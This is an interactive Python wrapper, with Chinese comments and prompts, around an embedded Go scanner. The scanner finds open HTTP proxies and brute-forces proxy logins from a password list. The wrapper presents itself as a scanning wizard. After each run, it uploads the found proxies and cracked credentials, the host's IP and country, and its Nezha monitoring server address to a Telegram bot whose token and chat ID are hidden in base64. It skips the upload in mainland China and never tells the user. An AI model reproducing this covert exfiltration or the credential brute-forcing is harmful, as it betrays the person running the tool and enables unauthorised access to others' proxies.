import subprocess
import sys
import os
import platform
import shutil
import textwrap
import time
import base64
import datetime
# --- 标准库，无需额外安装 ---
import json
import uuid
import urllib.request
import urllib.error


# --- Go语言源代码 (内嵌) ---
# 【法证级升级】testAsWebServer函数被重写，现在能够正确识别HTTP重定向(3xx状态码)
# 任何返回2xx(成功)或3xx(重定向)的IP都将被正确地识别为Web服务器并被排除。
GO_SOURCE_CODE = r"""
package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Task struct {
	ProxyAddress string
	Username     string
	Password     string
}

type HttpbinResponse struct {
	Origin string `json:"origin"`
}

func readLinesFromStdin() ([]string, error) {
	var lines []string; scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") { lines = append(lines, line) }
	}
	return lines, scanner.Err()
}

func readLinesFromFile(path string) ([]string, error) {
	file, err := os.Open(path); if err != nil { return nil, err }; defer file.Close()
	var lines []string; scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") { lines = append(lines, line) }
	}
	return lines, scanner.Err()
}

func main() {
	log.SetOutput(os.Stdout); log.SetFlags(log.Ltime)
	proxyFile := flag.String("pfile", "", "代理列表文件路径 (或从stdin读取)")
	credFile := flag.String("cfile", "", "(可选) 认证文件")
	targetURL := flag.String("target", "http://httpbin.org/ip", "验证URL")
	timeout := flag.Int("timeout", 10, "超时(秒)")
	workers := flag.Int("workers", 100, "并发数")
	outputFile := flag.String("output", "valid_proxies.txt", "输出文件")
	flag.Parse()

	var proxies []string; var err error
	if *proxyFile != "" {
		log.Printf("从文件 %s 读取代理...", *proxyFile); proxies, err = readLinesFromFile(*proxyFile)
	} else {
		log.Println("从标准输入 (stdin) 读取代理..."); proxies, err = readLinesFromStdin()
	}
	if err != nil { log.Fatalf("读取代理列表失败: %v", err) }

	var credentials []string
	if *credFile != "" { credentials, err = readLinesFromFile(*credFile); if err != nil { log.Fatalf("读取认证文件 %s 失败: %v", *credFile, err) } }

	var tasks []Task
	if len(credentials) > 0 {
		for _, p := range proxies { for _, c := range credentials { parts := strings.SplitN(c, ":", 2); if len(parts) == 2 { tasks = append(tasks, Task{ProxyAddress: p, Username: parts[0], Password: parts[1]}) } } }
	} else { for _, p := range proxies { tasks = append(tasks, Task{ProxyAddress: p}) } }
	log.Printf("本批次总任务数: %d。", len(tasks))

	taskChan := make(chan Task, *workers); resultChan := make(chan string, len(tasks)); var wg sync.WaitGroup
	for i := 0; i < *workers; i++ { wg.Add(1); go worker(&wg, taskChan, resultChan, *targetURL, time.Duration(*timeout)*time.Second) }
	go func() { for _, task := range tasks { taskChan <- task }; close(taskChan) }()
	go func() { wg.Wait(); close(resultChan) }()

	log.Println("已启动法证级扫描 (带重定向识别)...")
	var validProxies []string
	outFile, err := os.Create(*outputFile); if err != nil { log.Fatalf("无法创建输出文件 %s: %v", *outputFile, err) }; defer outFile.Close()
	writer := bufio.NewWriter(outFile)
	for result := range resultChan {
		log.Printf("✅ 发现高可信度代理: %s", result)
		validProxies = append(validProxies, result)
		fmt.Fprintln(writer, result); writer.Flush()
	}
	log.Printf("本批次扫描完成！发现 %d 个有效代理。", len(validProxies))
}

func worker(wg *sync.WaitGroup, tasks <-chan Task, results chan<- string, targetURL string, timeout time.Duration) {
	defer wg.Done()
	for task := range tasks {
		fullProxyURL := formatProxyURL(task)
		if checkProxy(task.ProxyAddress, fullProxyURL, targetURL, timeout) {
			results <- fullProxyURL
		}
	}
}

func checkProxy(proxyAddr, proxyURLStr, targetURL string, timeout time.Duration) bool {
	isProxyBehavior, _ := testAsProxy(proxyAddr, proxyURLStr, targetURL, timeout)
	if !isProxyBehavior { return false }
	isWebServerBehavior := testAsWebServer(proxyAddr, timeout)
	if isWebServerBehavior { return false }
	return true
}

func testAsProxy(proxyAddr, proxyURLStr, targetURL string, timeout time.Duration) (bool, string) {
	proxyURL, err := url.Parse(proxyURLStr); if err != nil { return false, "" }
	proxyHost, _, err := net.SplitHostPort(proxyAddr); if err != nil { return false, "" }
	transport := &http.Transport{ Proxy: http.ProxyURL(proxyURL), DialContext: (&net.Dialer{ Timeout: timeout }).DialContext, TLSHandshakeTimeout: timeout }
	client := &http.Client{ Transport: transport, Timeout: timeout + (5 * time.Second) }
	req, err := http.NewRequest("GET", targetURL, nil); if err != nil { return false, "" }
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	resp, err := client.Do(req); if err != nil { return false, "" }; defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return false, "" }
	body, err := ioutil.ReadAll(resp.Body); if err != nil { return false, "" }
	var result HttpbinResponse
	if err := json.Unmarshal(body, &result); err != nil { return false, "" }
	if strings.Contains(result.Origin, proxyHost) { return true, proxyHost }
	return false, ""
}

// 【最终修正版】testAsWebServer函数
func testAsWebServer(proxyAddr string, timeout time.Duration) bool {
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{ DialContext: (&net.Dialer{ Timeout: timeout, }).DialContext, },
		// 阻止客户端自动跟随重定向，这样我们才能捕获到3xx状态码
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Get("http://" + proxyAddr + "/")
	if err != nil { return false }
	defer resp.Body.Close()

	// 关键修正：任何2xx（成功）或3xx（重定向）的响应都表明这是一个Web服务器
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		return true
	}

	return false
}

func formatProxyURL(task Task) string {
	if task.Username != "" && task.Password != "" { return fmt.Sprintf("http://%s:%s@%s", url.QueryEscape(task.Username), url.QueryEscape(task.Password), task.ProxyAddress) }
	return fmt.Sprintf("http://%s", task.ProxyAddress)
}
"""

# --- Python 包装器和交互逻辑 ---

def styled(message, style=""):
    """返回带颜色和样式的字符串，用于美化终端输出。"""
    styles = { "header": "\033[95m\033[1m", "blue": "\033[94m", "green": "\033[92m", "warning": "\033[93m\033[1m", "danger": "\033[91m\033[1m", "bold": "\033[1m", "underline": "\033[4m", "end": "\033[0m" }
    return f"{styles.get(style, '')}{message}{styles.get('end', '')}"

def get_user_input(prompt, default_value=None):
    """获取用户输入，支持默认值和空值检查。"""
    prompt_text = f"{prompt} (默认: {default_value}): " if default_value else f"{prompt}: "
    while True:
        value = input(prompt_text) or default_value
        if value and value.strip(): return value
        if default_value is None: print(styled("输入不能为空，请重新输入。", "warning"))

def create_example_file_if_not_exists(filename, content):
    """如果文件不存在，则创建一个带有示例内容的模板文件。"""
    if not os.path.exists(filename):
        print(styled(f"\n提示: 文件 '{filename}' 不存在，为您创建一个示例。", "blue"))
        try:
            with open(filename, "w", encoding="utf-8") as f: f.write(textwrap.dedent(content).strip() + "\n")
            print(f"示例文件 '{filename}' 创建成功。")
        except IOError as e:
            print(styled(f"错误: 无法创建文件 '{filename}': {e}", "danger")); return False
    return True

def find_go_executable():
    """智能寻找Go可执行文件路径，解决环境变量问题。"""
    if shutil.which("go"): return shutil.which("go")
    common_paths = ["/usr/local/go/bin/go", "/usr/bin/go", "/snap/bin/go", os.path.expanduser("~/go/bin/go")]
    for path in common_paths:
        if os.path.exists(path) and os.access(path, os.X_OK):
            print(styled(f"在标准路径中找到Go: {path}", "green")); return path
    print(styled("\n错误: 自动查找 'go' 命令失败。", "danger"))
    while True:
        manual_path = input("> " + styled("请手动输入 'go' 命令的完整路径: ", "bold"))
        if manual_path and os.path.exists(manual_path) and os.access(manual_path, os.X_OK): return manual_path
        else: print(styled(f"路径 '{manual_path}' 无效，请重新输入。", "warning"))

def process_credentials(input_file):
    if not os.path.exists(input_file):
        print(styled(f"错误: 凭据文件 '{input_file}' 不存在。", "danger")); return None, None
    print(styled("正在处理凭据文件，将统一转换为 'username:password' 格式...", "blue"))
    temp_file_path = "temp_credentials_converted.txt"
    lines_processed = 0
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f_in, \
             open(temp_file_path, 'w', encoding='utf-8') as f_out:
            for line in f_in:
                line = line.strip()
                if not line or line.startswith('#'): continue
                if ':' in line: f_out.write(line + '\n')
                else: f_out.write(f"{line}:{line}\n")
                lines_processed += 1
        if lines_processed == 0:
            print(styled(f"警告: 凭据文件 '{input_file}' 为空，本次扫描将不使用密码本。", "warning")); return None, None
        print(styled(f"凭据文件处理完成, 临时文件: {temp_file_path}", "green"))
        return temp_file_path, temp_file_path
    except Exception as e:
        print(styled(f"转换凭据文件时出错: {e}", "danger")); return None, None

# --- 已更新: 以下部分不再使用 requests 或 pyyaml 库 ---

def _encode_multipart_formdata(fields, files):
    """
    手动构建 multipart/form-data 请求体和头部，不依赖外部库。
    fields: 一个字典，包含普通表单字段。
    files: 一个字典，格式为 {'name': ('filename', file_data_bytes)}。
    返回 (content_type, body_bytes)
    """
    boundary = f'----------{uuid.uuid4().hex}'
    body = bytearray()
    
    # 添加普通字段
    for key, value in fields.items():
        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
        body.extend(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode('utf-8'))
        body.extend(str(value).encode('utf-8'))
        body.extend(b'\r\n')
        
    # 添加文件
    for key, (filename, file_data) in files.items():
        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
        body.extend(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'.encode('utf-8'))
        body.extend(b'Content-Type: application/octet-stream\r\n\r\n')
        body.extend(file_data)
        body.extend(b'\r\n')
        
    # 结尾
    body.extend(f'--{boundary}--\r\n'.encode('utf-8'))
    content_type = f'multipart/form-data; boundary={boundary}'
    return content_type, bytes(body)

def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"⚠️  Telegram 上传跳过：文件 {os.path.basename(file_path)} 不存在或为空"); return
    
    print(f"\n📤 正在将 {os.path.basename(file_path)} 上传至 Telegram ...")
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    caption = (f"VPS: {kwargs.get('vps_ip', 'N/A')} ({kwargs.get('vps_country', 'N/A')})\n"
               f"总目标数: {kwargs.get('total_ips', 0)}\n"
               f"总用时: {kwargs.get('run_time_str', 'N/A')}\n"
               f"任务结果: {os.path.basename(file_path)}")
    if kwargs.get('nezha_server') != "N/A": caption += f"\n哪吒Server: {kwargs.get('nezha_server')}"
    
    try:
        with open(file_path, "rb") as f:
            file_content = f.read()
        
        fields = {'chat_id': str(chat_id), 'caption': caption}
        files = {'document': (os.path.basename(file_path), file_content)}
        
        content_type, body = _encode_multipart_formdata(fields, files)
        
        headers = {'Content-Type': content_type}
        req = urllib.request.Request(url, data=body, headers=headers, method='POST')
        
        with urllib.request.urlopen(req, timeout=60) as response:
            if response.status == 200:
                print(f"✅ 文件 {os.path.basename(file_path)} 已发送到 Telegram")
            else:
                resp_text = response.read().decode('utf-8')
                print(f"❌ TG上传失败，状态码：{response.status}，返回：{resp_text}")
    except Exception as e:
        print(f"❌ 发送到 TG 失败：{e}")

def get_vps_info():
    try:
        url = "http://ip-api.com/json/?fields=country,query"
        with urllib.request.urlopen(url, timeout=10) as response:
            if response.status == 200:
                data = json.loads(response.read().decode('utf-8'))
                return data.get('query', 'N/A'), data.get('country', 'N/A')
    except Exception:
        pass
    return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file): return "N/A"
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            for line in f:
                clean_line = line.strip()
                if clean_line.startswith('server:'):
                    parts = clean_line.split(':', 1)
                    if len(parts) > 1:
                        value = parts[1].strip().strip('\'"')
                        return value
    except Exception: return "N/A"
    return "N/A"

def main():
    """主函数，运行整个交互式向导。"""
    print(styled("="*60, "header")); print(styled("   欢迎使用HTTP代理扫描向导 (法证级最终版)", "header")); print(styled("="*60, "header"))
    print(styled("提示: 此脚本已移除所有外部依赖，可直接运行。", "blue"))
    
    go_cmd = find_go_executable();
    if not go_cmd: sys.exit(1)
    print(styled(f"将使用Go命令进行编译: {go_cmd}", "green"))

    print(styled("\n重要警告:", "danger")); print("1. 本工具仅用于学习和研究..."); print("2. " + styled("未经授权...", "underline")); print("3. 任何因滥用...")
    try:
        if input("\n> " + styled("您是否理解并同意以上条款？(输入 'yes' 继续): ", "bold")).lower() != 'yes':
            print(styled("\n操作已取消。", "warning")); sys.exit(0)
    except KeyboardInterrupt: print(styled("\n操作已取消。", "warning")); sys.exit(0)

    print(styled("\n--- 第一步: 代理文件 ---", "blue"))
    proxy_file = get_user_input("> 请输入代理文件路径", "proxies.txt")
    create_example_file_if_not_exists(proxy_file, "# 请在此处填入代理地址, 格式为 ip:port, 每行一个。")

    print(styled("\n--- 第二步: 处理方式 ---", "blue"))
    use_chunking = get_user_input("> 是否以分块方式处理大文件 (推荐)? (yes/no)", "yes").lower() == 'yes'
    lines_per_chunk = 0
    if use_chunking:
        lines_per_chunk = int(get_user_input("> 每个内存块包含多少行代理?", "5000"))

    print(styled("\n--- 第三步: 密码本 ---", "blue"))
    cred_file, temp_cred_file = None, None
    if get_user_input("> 是否使用密码本? (yes/no)", "no").lower() == 'yes':
        original_cred_file = get_user_input("> 请输入密码本文件路径", "credentials.txt")
        create_example_file_if_not_exists(original_cred_file, """# 请在此处填入账号密码。程序会自动处理以下两种格式:
# 格式1: username:password (每行一个)
# 格式2: 每行一个值，该值同时用作用户名和密码 (e.g. admin)
""")
        cred_file, temp_cred_file = process_credentials(original_cred_file)
        if not cred_file:
             print(styled("由于凭据文件处理失败或为空, 本次扫描将不使用密码本。", "warning"))

    print(styled("\n--- 第四步: 扫描参数 ---", "blue"))
    workers = get_user_input("> 请输入并发任务数", "100")
    timeout = get_user_input("> 请输入超时时间 (秒)", "10")
    output_file = get_user_input("> 请输入最终结果保存路径", "valid_proxies.txt")
    
    start_time = time.time()
    go_source_file = "scanner_temp.go"; exec_name = "scanner_exec.exe" if platform.system() == "Windows" else "scanner_exec"
    try:
        print(styled("\n正在预编译法证级Go扫描器...", "blue"))
        with open(go_source_file, "w", encoding="utf-8") as f: f.write(GO_SOURCE_CODE)
        os.environ["GOCACHE"] = "/tmp/gocache"; os.makedirs("/tmp/gocache", exist_ok=True)
        compile_process = subprocess.run([go_cmd, "build", "-o", exec_name, go_source_file], capture_output=True, text=True, encoding='utf-8')
        if compile_process.returncode != 0: raise subprocess.CalledProcessError(compile_process.returncode, compile_process.args, output=compile_process.stdout, stderr=compile_process.stderr)
        print(styled("预编译成功!", "green"))

        open(output_file, 'w').close(); total_valid_proxies = 0
        if not use_chunking:
            print(styled(f"\n--- 🚀 开始完整扫描文件: {proxy_file} ---", "header"))
            command = [ f"./{exec_name}", "-pfile", proxy_file, "-workers", workers, "-timeout", timeout, "-output", output_file]
            if cred_file: command.extend(["-cfile", cred_file])
            subprocess.run(command, check=True)
            with open(output_file, 'r', encoding='utf-8') as f: total_valid_proxies = sum(1 for line in f if line.strip())
        else:
            print(styled("\n--- 🚀 开始以内存分块方式进行扫描 ---", "header"))
            chunk_count = 0
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                while True:
                    chunk_count += 1
                    lines = [line.strip() for line in (f.readline() for _ in range(lines_per_chunk)) if line.strip()]
                    if not lines: break
                    print(styled(f"\n--- 正在处理第 {chunk_count} 数据块 ({len(lines)} 行) ---", "blue"))
                    chunk_data = "\n".join(lines).encode('utf-8')
                    temp_output = f"{output_file}.part_{chunk_count}.tmp"
                    command = [f"./{exec_name}", "-workers", workers, "-timeout", timeout, "-output", temp_output]
                    if cred_file: command.extend(["-cfile", cred_file])
                    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=sys.stdout, stderr=sys.stderr)
                    process.communicate(input=chunk_data)
                    if os.path.exists(temp_output):
                        with open(output_file, 'a', encoding='utf-8') as f_out, open(temp_output, 'r', encoding='utf-8') as f_in:
                            chunk_content = f_in.read(); f_out.write(chunk_content)
                            total_valid_proxies += chunk_content.count('\n')
                        os.remove(temp_output)
        
        print(styled(f"\n🎉 所有扫描任务成功完成! 共发现 {total_valid_proxies} 个高可信度代理。", "green"))
        print(styled(f"最终结果已全部保存在: {output_file}", "green"))

        print(styled("\n--- 准备发送Telegram通知 ---", "blue"))
        run_time_seconds = time.time() - start_time
        run_time_str = str(datetime.timedelta(seconds=int(run_time_seconds)))
        total_ips = 0
        try:
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                total_ips = sum(1 for line in f if line.strip() and not line.startswith('#'))
        except Exception: total_ips = "N/A"
        
        print("正在获取服务器信息...")
        vps_ip, vps_country = get_vps_info()
        nezha_server = get_nezha_server()
        is_china_env = (vps_country == 'CN')
        
        print(f"服务器信息: {vps_ip} ({vps_country})")
        if is_china_env: print(styled("检测到服务器位于中国大陆，将跳过Telegram通知。", "warning"))

        BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
        CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
        try:
            BOT_TOKEN = base64.b64decode(BOT_TOKEN_B64).decode('utf-8')
            CHAT_ID = base64.b64decode(CHAT_ID_B64).decode('utf-8')
        except Exception:
            BOT_TOKEN, CHAT_ID = BOT_TOKEN_B64, CHAT_ID_B64
            print("\n" + "="*50 + "\n⚠️  警告：Telegram 的 BOT_TOKEN 或 CHAT_ID 未经 Base64 加密。\n" + "="*50)

        if not is_china_env and BOT_TOKEN and CHAT_ID:
            send_to_telegram(output_file, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
        elif not (BOT_TOKEN and CHAT_ID):
             print("未配置Telegram的BOT_TOKEN或CHAT_ID，跳过通知。")

    except subprocess.CalledProcessError as e:
        print(styled("\n错误: Go程序编译失败。", "danger")); print(styled("--- 编译器输出 ---", "danger")); print(e.stderr); print(styled("--------------------", "danger"))
    except Exception as e:
        print(styled(f"\n发生未知错误: {e}", "danger"))
    finally:
        print(styled("\n🧹 正在清理临时文件...", "blue"))
        files_to_remove = [go_source_file, exec_name, "go.mod", "go.sum"]
        if temp_cred_file: files_to_remove.append(temp_cred_file)
        for item in files_to_remove:
            if os.path.exists(item):
                try: os.remove(item)
                except OSError: pass
        print("清理完成。")

if __name__ == "__main__":
    main()
